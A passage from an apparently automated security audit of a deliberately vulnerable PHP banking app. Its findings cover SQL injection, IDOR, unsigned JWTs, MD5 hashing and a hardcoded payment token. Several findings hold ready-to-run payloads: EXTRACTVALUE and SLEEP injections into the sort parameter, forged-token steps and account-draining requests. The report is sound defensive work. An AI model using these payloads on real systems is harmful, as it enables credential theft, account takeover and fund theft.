    "GET /api/transactions?sort=id,EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) (or account_id-filtered variant)",
    "TransactionController::index copies $_GET['sort'] with no allowlist into Transaction::findByUser",
    "findByUser interpolates ORDER BY t.{$sort} DESC before PDO::prepare; bound params cover only IDs/LIMIT/OFFSET",
    "PDO ERRMODE_EXCEPTION; public/index.php returns $e->getMessage(), file, line, trace",
    "Error-based ORDER BY injection leaks password_hash, totp_secret, card_number, balances"
  ],
  "impact": "Authenticated SQL injection via sort: error-based extraction of arbitrary database contents including credentials, TOTP seeds, and card data.",
  "severity_reasoning": "Both query branches interpolate the identifier. Native prepares block stacked queries but not ORDER BY expressions. The global exception handler is an explicit oracle. Registration is public, so any outsider can obtain a token. High.",
  "dynamic_test": "Register, then GET /api/transactions?sort=id,EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) and GET /api/transactions?account_id=<own>&sort=id,EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password_hash FROM users LIMIT 1))). Confirm 500 JSON error body contains extracted data."
}
```

#### Validator reasoning

Confirmed source-to-sink SQL injection. GET /api/transactions is routed with customer JWT auth (Router.php:79). TransactionController::index copies $_GET['sort'] unchanged (default 'created_at') and passes it as the $sort argument to Transaction::findByUser. There is no allowlist, regex, identifier quoting, or Validator rule on this parameter.

findByUser interpolates $sort into the SQL string before prepare() in both branches: ORDER BY t.{$sort} DESC. Bound parameters cover only account/user IDs and LIMIT/OFFSET, so the ORDER BY identifier is attacker-controlled SQL. ATTR_EMULATE_PREPARES=false does not protect interpolated SQL text. The t. prefix is not a control: a payload such as id,EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) yields ORDER BY t.id,EXTRACTVALUE(...) DESC, which MySQL evaluates as a second ORDER BY expression.

PDO is configured with ERRMODE_EXCEPTION. public/index.php's global catch returns $e->getMessage() plus file/line/trace via Response::error, so error-based payloads leak query results (users.password_hash, totp_secret, accounts.card_number/card_cvv/balance, etc.). Registration is public (POST /api/auth/register, auth=false), so any attacker can obtain a valid customer JWT. Account ownership checks apply only to optional account_id and never sanitize sort. No WAF or input filter exists in .htaccess or middleware.

#### Code evidence

```
TransactionController.php:
$sort = $_GET['sort'] ?? 'created_at';
$result = Transaction::findByUser($userId, $page, $perPage, $accountId, $sort);

Transaction.php findByUser:
$stmt = $db->prepare(
    "SELECT t.* FROM transactions t
     WHERE (t.from_account_id = ? OR t.to_account_id = ?)
     ORDER BY t.{$sort} DESC
     LIMIT ? OFFSET ?"
);
$stmt->execute([$accountId, $accountId, $perPage, $offset]);
// else branch:
"SELECT t.* FROM transactions t
 JOIN accounts a ON t.from_account_id = a.id
 WHERE a.user_id = ?
 ORDER BY t.{$sort} DESC
 LIMIT ? OFFSET ?"

public/index.php:
} catch (\Throwable $e) {
    Response::error('INTERNAL_ERROR', $e->getMessage(), 500, [
        'file'  => $e->getFile(),
        'line'  => $e->getLine(),
        'trace' => $e->getTraceAsString(),
    ]);
}
```

## 49. BOLA: any authenticated user can read another user's transaction by ID

- Lead reference: ENCX-049
- Category: API1
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Transaction.php:13
- Fingerprint: e67fa57091e9ebc5d5c1845c2026bbe70c6565c8d26f6e4472cecc1d03f419fb

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 41,
  "symbol": "$vars['id']",
  "input": "path parameter id"
}
```

#### Controls encountered

```
[
  "JWT authentication required (AuthMiddleware; any registered user token is sufficient)",
  "Path parameter constrained to digits ({id:\\d+}) and cast to int (prevents SQLi, not BOLA)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Transaction.php",
  "line": 13,
  "symbol": "$stmt->execute([$id]);",
  "operation": "SELECT * FROM transactions WHERE id = ? without ownership filter"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Any registered customer authenticates (public register)",
    "GET /api/transactions/{id:\\d+} with sequential auto-increment id",
    "AuthMiddleware authenticates; TransactionController::show never reads $auth['user']['id']",
    "Transaction::findById SELECT * FROM transactions WHERE id = ? with no ownership join",
    "Transaction::format returns from_account_id, to_bsb, to_account_number, amount, description, receipt_number, FX fields"
  ],
  "impact": "BOLA: any authenticated user can enumerate and read other customers' full transfer receipts.",
  "severity_reasoning": "Sibling account and address-book show handlers use findByIdAndUser; this one does not. Digit constraint prevents SQLi but not IDOR. High confidentiality impact on banking receipts (amounts, account numbers).",
  "dynamic_test": "Create a transfer as user A, capture id. As user B, GET /api/transactions/<id>. Expect 200 with A's BSB, account number, amount, and receipt_number. Sweep ids 1..N."
}
```

#### Validator reasoning

Confirmed BOLA on GET /api/transactions/{id}. Router.php:80 registers the route with auth=true, so AuthMiddleware validates a JWT and passes $auth into TransactionController::show. show() (TransactionController.php:39-47) receives $auth but never reads $auth['user']['id']; it only casts the path id and calls Transaction::findById. That method (Transaction.php:9-16) runs SELECT * FROM transactions WHERE id = ? with no join or filter on the caller's accounts/user_id, then Transaction::format returns the full row including from_account_id, to_bsb, to_account_number, amount, description, transfer_type, receipt_number, and FX fields. Schema.sql defines transactions.id as INT AUTO_INCREMENT, and the route is {id:\d+}, so any registered customer can enumerate sequential IDs. Registration is public (AuthController::register), so obtaining a token is trivial. Sibling handlers (AccountController::show, AddressBookController::show, TransactionController::index) correctly use findByIdAndUser / findByUser; Transaction has no equivalent ownership method. JWT auth, digit constraint, and int cast do not constitute object-level authorization.

#### Code evidence

```
Router.php:
$r->addRoute('GET', '/api/transactions/{id:\\d+}', ['handler' => [TransactionController::class, 'show'], 'auth' => true]);

TransactionController::show:
$txn = Transaction::findById((int)$vars['id']);
if (!$txn) {
    Response::notFound('Transaction not found.');
}
Response::success(Transaction::format($txn));

Transaction::findById:
$stmt = $db->prepare('SELECT * FROM transactions WHERE id = ?');
$stmt->execute([$id]);
$txn = $stmt->fetch();
return $txn ?: null;
```

## 50. Hardcoded machine-token fallback always authenticates payment APIs

- Lead reference: ENCX-050
- Category: A07
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/MachineToken.php:26
- Fingerprint: e13d6be22bc6ef1ff463cd047e691c21b5b5ff18cfa51193dca6a09ef7a2e51e

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Models/MachineToken.php",
  "line": 25,
  "symbol": "$fallbackToken",
  "input": "hardcoded/config default machine_token"
}
```

#### Controls encountered

```
[
  "SHA-256 hashed lookup of active rows in machine_tokens (bypassed on miss)",
  "is_active flag applies only to DB tokens; deactivated identical secret still matches fallback",
  "PaymentController::transfer restricts configured_machine_token / face_insurance to FACE Insurance source accounts (still $100M seeded balance)",
  "MACHINE_TOKEN env can override the fallback string, but is unset in Docker, deploy.sh, and .env.example"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/MachineToken.php",
  "line": 26,
  "symbol": "$rawToken === $fallbackToken",
  "operation": "plaintext comparison accepting default machine credential"
}
```

#### Counterevidence

```
[
  "If MACHINE_TOKEN is set to a non-default value, the hardcoded source string is no longer the fallback comparator.",
  "On a seeded DB the same secret also authenticates via the hashed DB row (name face_insurance) before the fallback branch runs.",
  "README presents the app as a pentest/benchmark target; that does not remove the live default-credential path."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Unauthenticated caller Authorization: Bearer mch_face_insurance_secret_key_2026",
    "POST /api/payments/process or /api/payments/transfer (auth => machine)",
    "MachineAuthMiddleware -> MachineToken::validateToken SHA-256 DB lookup",
    "On miss (or inactive row), plaintext compare to config machine_token default mch_face_insurance_secret_key_2026; fallback is not gated on empty table",
    "Accepted as configured_machine_token; process() charges cards, transfer() debits FACE Insurance source accounts"
  ],
  "impact": "Published default machine credential remains valid even after a different DB token is seeded, granting unauthenticated access to fund-moving payment APIs.",
  "severity_reasoning": "Comment claims empty-table-only fallback but code always compares on miss. Docker/deploy never set MACHINE_TOKEN. Tests assert the default validates. High-impact default credential on payment execution.",
  "dynamic_test": "Deactivate or replace the DB machine_tokens row, then POST /api/payments/process with Bearer mch_face_insurance_secret_key_2026 and a seeded PAN. Confirm the fallback still authenticates and the charge succeeds. Also confirm the same secret works on a seeded DB via the hash path."
}
```

#### Validator reasoning

The claimed always-on machine-token fallback is present and reachable. MachineToken::validateToken hashes the bearer and queries machine_tokens for an active hash. On any miss it loads config/app.php and accepts a plaintext match against $config['machine_token'], which defaults to the hardcoded secret mch_face_insurance_secret_key_2026. The comment claims this is only for an empty/unseeded table, but the code never checks table emptiness: any token absent from (or inactive in) the DB is compared to the published default.

Router maps POST /api/payments/process and POST /api/payments/transfer with auth => machine. MachineAuthMiddleware extracts Authorization: Bearer and calls validateToken; a match proceeds with no customer JWT. PaymentController::process then charges any valid credit card into any merchant (no machine-name binding; CVV is optional). PaymentController::transfer with the fallback identity configured_machine_token is limited to FACE Insurance source accounts (merchant account id 100 / user_id 16), which seed.sql funds at $100,000,000 — still a fund-moving sink.

No effective blocking control exists in the documented default deploy: Docker does not set MACHINE_TOKEN, deploy.sh generates JWT secrets but never MACHINE_TOKEN, and .env.example omits it. seed.sql inserts the same secret as a hashed DB row, so the default token also succeeds via the DB path; deactivating that row still leaves the fallback live. tests/PaymentTest.php asserts the hardcoded secret validates. Admin UI and AdminSystemController also publish the same value. A custom MACHINE_TOKEN env would change the fallback string, but that is not the Docker/default path.

#### Code evidence

```
MachineToken::validateToken:
$tokenHash = hash('sha256', $rawToken);
$stmt = $db->prepare('SELECT * FROM machine_tokens WHERE token_hash = ? AND is_active = 1');
$stmt->execute([$tokenHash]);
$token = $stmt->fetch();
if ($token) {
    return $token;
}
$config = require __DIR__ . '/../../config/app.php';
$fallbackToken = $config['machine_token'] ?? 'mch_face_insurance_secret_key_2026';
if ($rawToken === $fallbackToken) {
    return [
        'id' => 0,
        'name' => 'configured_machine_token',
        'is_active' => 1,
    ];
}

config/app.php:
'machine_token' => getenv('MACHINE_TOKEN') ?: 'mch_face_insurance_secret_key_2026',

Router.php:
$r->addRoute('POST', '/api/payments/process', [..., 'auth' => 'machine']);
$r->addRoute('POST', '/api/payments/transfer', [..., 'auth' => 'machine']);
```

## 51. SQL injection via sort in unfiltered transaction query branch

- Lead reference: ENCX-051
- Category: A03
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Transaction.php:62
- Fingerprint: 96c7f0e60404c611a7e8c4c978ef60db7388d016fda353bbe07c59c0ceed2b8e

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 19,
  "symbol": "$_GET['sort']",
  "input": "query parameter sort"
}
```

#### Controls encountered

```
[
  "JWT AuthMiddleware on GET /api/transactions (does not constrain sort)",
  "PDO bound parameters for userId/LIMIT/OFFSET only (ORDER BY identifier is interpolated)",
  "PDO::ATTR_EMULATE_PREPARES=false (blocks stacked queries, not in-statement ORDER BY injection)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Transaction.php",
  "line": 62,
  "symbol": "$stmt->execute([$userId, $perPage, $offset]);",
  "operation": "PDO execute of SQL with interpolated ORDER BY"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated customer GET /api/transactions?sort=<payload> with no account_id (default listing)",
    "TransactionController passes unsanitized sort into findByUser else branch",
    "SQL: SELECT t.* ... JOIN accounts ... WHERE a.user_id = ? ORDER BY t.{$sort} DESC LIMIT ? OFFSET ? then execute([userId, perPage, offset])",
    "Error-based EXTRACTVALUE/updatexml via reflected PDO exceptions dumps other tables"
  ],
  "impact": "Default transaction listing path is an independent ORDER BY SQL injection oracle for arbitrary DB data.",
  "severity_reasoning": "This is the unfiltered branch (no account_id), so it is the common dashboard/history call. Bound parameters do not cover the identifier. High.",
  "dynamic_test": "GET /api/transactions?sort=id,EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password_hash FROM users LIMIT 1))) with a customer JWT and no account_id. Confirm the 500 body contains the hash."
}
```

#### Validator reasoning

Authenticated SQL injection is reachable on the default GET /api/transactions path. TransactionController::index copies $_GET['sort'] with no allowlist, encoding, or identifier validation and passes it into Transaction::findByUser. When account_id is omitted, the else branch interpolates that value into the ORDER BY clause of a double-quoted SQL string before PDO prepare/execute. Bound parameters cover only userId, LIMIT, and OFFSET; identifiers cannot be parameterized. PDO is configured with ERRMODE_EXCEPTION and native prepares, and public/index.php's global handler returns $e->getMessage() (plus file/line/trace) to the client, providing an error-based oracle. An authenticated user can therefore inject into ORDER BY (e.g. sort=id,EXTRACTVALUE(...(SELECT password_hash FROM users LIMIT 1)...)) and read extracted data from the XPATH syntax error. users.password_hash exists in schema.sql. JWT auth is required but is not a blocking control for this authenticated data-exfiltration path.

#### Code evidence

```
TransactionController.php:
$sort = $_GET['sort'] ?? 'created_at';
$result = Transaction::findByUser($userId, $page, $perPage, $accountId, $sort);

Transaction.php else branch:
$stmt = $db->prepare(
    "SELECT t.* FROM transactions t
     JOIN accounts a ON t.from_account_id = a.id
     WHERE a.user_id = ?
     ORDER BY t.{$sort} DESC
     LIMIT ? OFFSET ?"
);
$stmt->execute([$userId, $perPage, $offset]);
```

## 52. SQL injection via unsanitized ORDER BY sort parameter

- Lead reference: ENCX-052
- Category: A03
- Severity: HIGH
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Transaction.php:44
- Fingerprint: d199b3586667e0660ced8fb096eb4605ca97bd1684d5ce29614b01773643900c

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 19,
  "symbol": "$_GET['sort']",
  "input": "query.sort"
}
```

#### Controls encountered

```
[
  "AuthMiddleware requires a valid Bearer token (registration is public)",
  "PDO native prepared statements bind LIMIT/OFFSET and account/user IDs only",
  "PDO ATTR_EMULATE_PREPARES=false blocks stacked queries but not ORDER BY expression injection"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Transaction.php",
  "line": 44,
  "symbol": "ORDER BY t.{$sort}",
  "operation": "sql_query"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Public register -> customer JWT",
    "GET /api/transactions?sort=id,SLEEP(5) or boolean/error ORDER BY expressions",
    "$_GET['sort'] interpolated into ORDER BY t.{$sort} in both findByUser query variants",
    "Native PDO prepares block stacked queries; expression injection remains",
    "Time-based, boolean, or EXTRACTVALUE channels read users.password_hash, totp_secret, accounts.card_cvv"
  ],
  "impact": "Authenticated ORDER BY SQL injection allowing exfiltration of credentials and card SAD.",
  "severity_reasoning": "No allowlist or identifier quoting anywhere on sort. t. prefix is escaped by a comma. High confidence expression-based SQLi on a banking listing API.",
  "dynamic_test": "Time a GET /api/transactions?sort=id,SLEEP(5) versus sort=created_at. Then EXTRACTVALUE payload to pull password_hash into the JSON error. Repeat with account_id set to confirm both branches."
}
```

#### Validator reasoning

Confirmed authenticated SQL injection with a complete source-to-sink path and no effective identifier control.

Source: GET /api/transactions is registered in Router.php with auth=true. TransactionController::index reads $sort = $_GET['sort'] ?? 'created_at' with no allowlist, regex, quoting, or Validator check, then passes it to Transaction::findByUser(). Registration (POST /api/auth/register) is public, so any attacker can obtain a Bearer token.

Sink: Transaction::findByUser interpolates the raw string into both query variants before PDO::prepare:
  ORDER BY t.{$sort} DESC
(lines 44 and 59). LIMIT/OFFSET and account/user IDs are bound parameters; $sort is not.

Database is MySQL (Database.php mysql DSN, schema.sql InnoDB). PDO::ATTR_EMULATE_PREPARES is false, which blocks stacked queries but does not prevent expression injection inside ORDER BY. The t. prefix is escaped by a comma: sort=id,SLEEP(5) becomes ORDER BY t.id,SLEEP(5) DESC.

Error-based exfiltration is practical because public/index.php's global catch returns $e->getMessage() (and file/line/trace) to the client, and PDO is ERRMODE_EXCEPTION. Payload shape: GET /api/transactions?sort=id,EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password_hash FROM users LIMIT 1))) yields the hash in the 500 JSON body. Time-based (SLEEP) and boolean ORDER BY IF(...) channels also work. Sensitive columns in-scope include users.password_hash, users.totp_secret, accounts.card_number, and accounts.card_cvv.

No allowlist, identifier quoting, or other sanitization exists anywhere on this parameter. AuthMiddleware is not a blocking control for this issue.

#### Code evidence

```
TransactionController::index: $sort = $_GET['sort'] ?? 'created_at'; then Transaction::findByUser(..., $sort);
findByUser interpolates: ORDER BY t.{$sort} DESC with no identifier quoting or allowlist.
```

## 53. User API responses leak password hashes and TOTP secrets

- Lead reference: ENCX-053
- Category: A02
- Severity: HIGH
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/User.php:83
- Fingerprint: 6e4b3c6d97b15593e65fd04d8306a5f301cb5b789891b73480558cd943100c25

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Models/User.php",
  "line": 14,
  "symbol": "$stmt->fetch()",
  "input": "database.users"
}
```

#### Controls encountered

```
[
  "AuthMiddleware on GET/PUT /api/profile authenticates the caller but does not redact password_hash or totp_secret",
  "Register/login are intentionally unauthenticated and still return toPublic()",
  "Response::success json_encodes the payload with no field filtering"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/User.php",
  "line": 83,
  "symbol": "toPublic",
  "operation": "sensitive_data_exposure"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "POST /api/auth/register or login (unauthenticated) or GET/PUT /api/profile (authenticated)",
    "User::findById/findByEmail SELECT * loads password_hash and totp_secret",
    "User::toPublic copies both fields into the client object",
    "Response::success json_encodes with no redaction; PUT /api/profile?user_id IDOR returns another user's toPublic"
  ],
  "impact": "Credential and 2FA-secret disclosure on every user-facing serializer path, including cross-user theft via the profile user_id IDOR.",
  "severity_reasoning": "Admin show already omits these fields, proving they are not required. New registrations are unsalted MD5, so leaked hashes are immediately crackable. High.",
  "dynamic_test": "POST /api/auth/login and GET /api/profile: assert password_hash and totp_secret in JSON. Then PUT /api/profile {\"user_id\": <other>} with no other fields and confirm the victim's hash and totp_secret are returned."
}
```

#### Validator reasoning

User::toPublic() explicitly serializes password_hash and totp_secret into the array it returns. Those values come from SELECT * fetches in User::findById/findByEmail (and AuthMiddleware, which loads the full row). Response::success() json_encodes the array with no redaction.

Concrete source-to-sink paths:
1. POST /api/auth/register and POST /api/auth/login call User::toPublic($user) and return it in the success payload (no auth required). Newly registered hashes are unsalted MD5 (AuthService::hashPassword), so a captured response is immediately crackable.
2. GET /api/profile returns User::toPublic($auth['user']) for any authenticated caller, leaking that user's stored hash and TOTP secret on every profile load.
3. PUT /api/profile accepts an unauthenticated-against-target user_id, then returns User::toPublic(User::findById($targetUserId)). A caller can send {"user_id": N} with no other fields, skip the update, and receive another user's password_hash and totp_secret.

No effective control strips these fields. AuthMiddleware only authenticates the caller; it still attaches the full user row. AdminUserController::show builds a subset that omits password_hash/totp_secret, confirming the public serializer is not following the safer admin pattern. Impact is credential theft plus 2FA bypass, including cross-user via the profile-update IDOR.

#### Code evidence

```
User::toPublic returns password_hash and totp_secret. Callers: AuthController::register/login, ProfileController::show/update all Response::success(User::toPublic($user)).
```

## 54. IDOR allows updating and reading another user's profile

- Lead reference: ENCX-054
- Category: A01
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:56
- Fingerprint: 0ca5a2c27d8ef09c515197e009a255a16c7091e8039f12f1b8bb27dc0e1a7089

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 53,
  "symbol": "$data['user_id']",
  "input": "body.user_id"
}
```

#### Controls encountered

```
[
  "AuthMiddleware requires a valid Bearer JWT (authentication only; no ownership/authorization check on body.user_id)",
  "User::update column allowlist restricts writable fields but still applies those writes to the client-chosen user id",
  "Validator type/length checks on profile fields; user_id is not validated or bound to the subject"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/User.php",
  "line": 65,
  "symbol": "$stmt->execute($values)",
  "operation": "sql_update"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker PUT /api/profile JSON {\"user_id\": <victim>, optional profile fields}",
    "AuthMiddleware binds caller identity; handler still takes body.user_id as $targetUserId with no comparison to $user['id']",
    "User::update($targetUserId, allowlisted fields) mutates the victim",
    "Always User::findById($targetUserId) + toPublic() returns password_hash and totp_secret"
  ],
  "impact": "BOLA: mutate another customer's PII/email and steal their password hash and TOTP secret even with an empty update.",
  "severity_reasoning": "Comment explicitly allows specifying which profile to update. Column allowlist does not constrain the target id. Combined secret leak makes this account takeover, not just PII edit. High.",
  "dynamic_test": "As user A, PUT /api/profile {\"user_id\": <B>, \"email\": \"new-b@example.com\"}. Confirm B can no longer login with the old email and the response includes B's password_hash. Repeat with only {\"user_id\": <B>} to show read-only secret theft."
}
```

#### Validator reasoning

PUT /api/profile is a live authenticated route (Router.php) that always invokes ProfileController::update. After AuthMiddleware binds $auth['user'] from the JWT subject, the handler still takes an optional JSON body user_id and uses it as the target without comparing it to $user['id'] (comment: "Allow specifying which profile to update"). Allowed profile fields are then written via User::update($targetUserId, $updateData) (parameterized UPDATE users SET ... WHERE id = ?), so any authenticated caller can change another customer's name/email/phone/address. Independently of whether any fields are written, the handler always does User::findById($targetUserId) and returns User::toPublic(), which includes password_hash and totp_secret. Therefore an authenticated attacker can both mutate another user's profile and exfiltrate that user's password hash and 2FA secret by sending e.g. PUT /api/profile {"user_id": <victim>}. Auth, the update-column allowlist, and field-type validation do not constrain which user_id is targeted.

#### Code evidence

```
$targetUserId = isset($data['user_id']) ? (int)$data['user_id'] : (int)$user['id'];
User::update($targetUserId, $updateData);
$updated = User::findById($targetUserId);
Response::success(User::toPublic($updated), ...);
```

## 55. Unsalted MD5 used for password hashing and verification

- Lead reference: ENCX-055
- Category: A02
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:24
- Fingerprint: 8d01df809fe0bacddae67a863bf05114fbf5dd4e94c11adbe05b5ed931d2f27f

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AuthController.php",
  "line": 33,
  "symbol": "hashPassword",
  "input": "body.password"
}
```

#### Controls encountered

```
[
  "AdminUserController::resetPassword uses password_hash(..., PASSWORD_BCRYPT) for admin-initiated resets only",
  "verifyPassword falls back to password_verify for hashes whose length is not 32 (seeded bcrypt users)",
  "install/seed.sql stores bcrypt hashes for demo users"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/AuthService.php",
  "line": 24,
  "symbol": "md5",
  "operation": "password_hash"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Unauthenticated POST /api/auth/register with body.password (min length 1)",
    "AuthController::register stores AuthService::hashPassword = md5($password) into users.password_hash",
    "Response returns User::toPublic including the 32-hex hash",
    "Login verifyPassword treats strlen===32 as MD5 via md5($password)===$hash (not hash_equals/password_verify)",
    "Attacker rainbow-tables or GPU-cracks the leaked hash and logs in"
  ],
  "impact": "All self-registered accounts use unsalted MD5; combined with hash leakage, plaintext passwords are trivially recovered and used to authenticate.",
  "severity_reasoning": "hashPassword is a one-line md5 with no salt/iterations. Seeded bcrypt users and admin resets do not protect the public registration path. High because the algorithm is broken and hashes are returned to clients.",
  "dynamic_test": "POST /api/auth/register with password \"Password1\". Confirm returned password_hash equals md5(\"Password1\"). Crack/compare offline, then POST /api/auth/login with the recovered plaintext."
}
```

#### Validator reasoning

AuthService::hashPassword() is a one-line unsalted MD5 (`return md5($password);`) and is the only hashing used on the customer registration path. POST /api/auth/register is public (`Router.php` sets `'auth' => false`). AuthController::register takes body.password (min length 1), stores AuthService::hashPassword() into users.password_hash, then returns User::toPublic() which explicitly includes password_hash (and totp_secret). Login uses verifyPassword(), which treats any 32-character stored value as MD5 and compares with `md5($password) === $hash` (not password_verify, not hash_equals). Seeded users and admin reset use bcrypt, but those paths do not protect newly registered accounts. Combined with the hash leak on register/login/profile responses, an attacker can recover plaintext passwords with rainbow tables or GPU cracking and then authenticate. No salt, iteration, or password-hashing API is present on this source-to-sink path.

#### Code evidence

```
hashPassword: return md5($password);
verifyPassword: if (strlen($hash) === 32) return md5($password) === $hash;
AuthController::register stores AuthService::hashPassword($data['password']).
```

## 56. JWT decoded without signature verification enabling auth bypass

- Lead reference: ENCX-056
- Category: A02
- Severity: HIGH
- Confidence: 98%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:58
- Fingerprint: 8de80c48c6cbcff1ed673076b6369cfd2836b3a1be97a2e3eca9724244d08f75

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Middleware/AuthMiddleware.php",
  "line": 21,
  "symbol": "$matches[1]",
  "input": "header.Authorization"
}
```

#### Controls encountered

```
[
  "Expiry timestamp is checked (attacker sets a future exp)",
  "Revocation list is consulted by jti (attacker chooses a fresh unused jti)",
  "User::findById(payload.sub) requires an existing user id (enumerable / sequential)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/AuthService.php",
  "line": 58,
  "symbol": "decodeToken",
  "operation": "jwt_verify"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Unauthenticated attacker crafts Authorization: Bearer <base64(header).base64({\"sub\":<victim>,\"jti\":\"fresh\",\"exp\":future}).dummy>",
    "Any auth => true customer route (GET /api/profile, transfers, accounts)",
    "AuthMiddleware -> AuthService::decodeToken never inspects parts[2] or jwt_secret",
    "Expiry and revocation checks use attacker-controlled exp/jti; User::findById(sub) loads victim",
    "Full customer session including money-moving APIs"
  ],
  "impact": "Complete unauthenticated authentication bypass and account takeover of any existing customer.",
  "severity_reasoning": "Signature verification is omitted by design comment. Remaining checks are attacker-controlled. Highest-confidence customer auth failure.",
  "dynamic_test": "Without logging in, send GET /api/profile and POST /api/transfers/external with a forged three-part token for sub=1. Confirm the profile of user 1 is returned and the transfer is authorized as that user."
}
```

#### Validator reasoning

AuthService::decodeToken() never verifies the JWT signature. It only splits on '.', base64-decodes parts[1], json_decodes the payload, and checks that exp exists and is in the future. parts[2] is unused. Firebase JWT is imported and used by createToken(), but decodeToken() explicitly comments "without strict signature verification" and does not call JWT::decode.

AuthMiddleware is the sole gate for every customer route with auth=true (profile, accounts, transfers, transactions, FX, insurance SSO, logout). It takes the Bearer token from HTTP_AUTHORIZATION, calls decodeToken(), checks isTokenRevoked($payload->jti), then User::findById($payload->sub) and treats that user as authenticated.

None of the remaining checks bind the token to a secret:
- exp is attacker-controlled (set far in the future)
- jti is attacker-controlled (choose a fresh unused value so the revocation table miss)
- sub only needs to be an existing user id (seed/register IDs are sequential and enumerable)

An unauthenticated attacker can mint header.payload.signature with an arbitrary sub and obtain a full customer session, including GET /api/profile and money-moving transfer endpoints. AdminAuthMiddleware correctly uses JWT::decode, which underscores that the customer path is an implementation omission, not a framework guarantee.

#### Code evidence

```
Comment: 'Decode token payload without strict signature verification'
$payload = json_decode(base64_decode(strtr($parts[1], '-_', '+')));
if (!$payload || !isset($payload->exp) || $payload->exp < time()) return null;
return $payload;
AuthMiddleware: $payload = AuthService::decodeToken($token); User::findById($payload->sub);
```

## 57. External transfer IDOR drains any customer's source account

- Lead reference: ENCX-057
- Category: A01
- Severity: HIGH
- Confidence: 98%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:174
- Fingerprint: 61b21ab5609c8a56870e244961622cc57c4ca9f3707c10b0bcaa5aa56bec094d

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 111,
  "symbol": "$data['from_account_id']",
  "input": "body.from_account_id"
}
```

#### Controls encountered

```
[
  "AuthMiddleware requires a Bearer token (any logged-in user, not the account owner)",
  "Address-book payees are scoped with findByIdAndUser (does not bind the source account; attacker uses their own payee)",
  "Destination BSB/account format validation (attacker can supply their own valid destination)",
  "TOTP required for manual/unverified payees but bypassed when totp_enabled is false or totp_code is omitted",
  "Account existence check via findById (no user_id predicate)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/TransferService.php",
  "line": 174,
  "symbol": "Account::findById",
  "operation": "authorization_check"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker POST /api/transfers/external with from_account_id of another customer",
    "TransactionController forwards body.from_account_id unchanged",
    "TransferService::transferExternal Account::findById (VULNERABILITY #23) instead of findByIdAndUser used by transferOwn",
    "Account::updateBalance($fromAccountId, '-' . $debitAmount) debits the victim; internal destination credits attacker"
  ],
  "impact": "Any logged-in user can drain any source account (including other customers) to a payee they control; missing balance check also allows unbounded overdraft.",
  "severity_reasoning": "Ownership control exists on the sibling own-transfer path and is omitted here. Sequential account IDs. Direct fund theft. High.",
  "dynamic_test": "As user A, POST /api/transfers/external {from_account_id: <B's account>, to_bsb, to_account_number of A, amount} omitting totp_code. Confirm B's balance decreases and A's increases."
}
```

#### Validator reasoning

